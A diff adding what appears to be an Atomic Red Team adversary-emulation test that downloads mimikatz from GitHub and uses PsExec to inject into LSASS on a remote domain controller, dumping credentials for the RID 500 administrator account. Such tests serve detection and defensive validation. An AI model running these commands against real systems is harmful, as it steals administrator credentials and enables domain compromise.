@@ -1,0 +1,16 @@
+#TechniqueName: Process Injection
+#AtomicTestName: Remote Process Injection in LSASS via mimikatz
+#Description: Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).&It must be executed in the context of a user who is privileged on remote `machine`.&&The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>&
+#Language: cmd
+
+#get_prereq_commands
+$mimikatz_path = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe
+Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+
+
+#commands
+C:\PSTools\PsExec.exe /accepteula \\DC1 -s -c %tmp%\mimikatz\x64\mimikatz.exe "lsadump::lsa /inject /id:500" "exit"
+
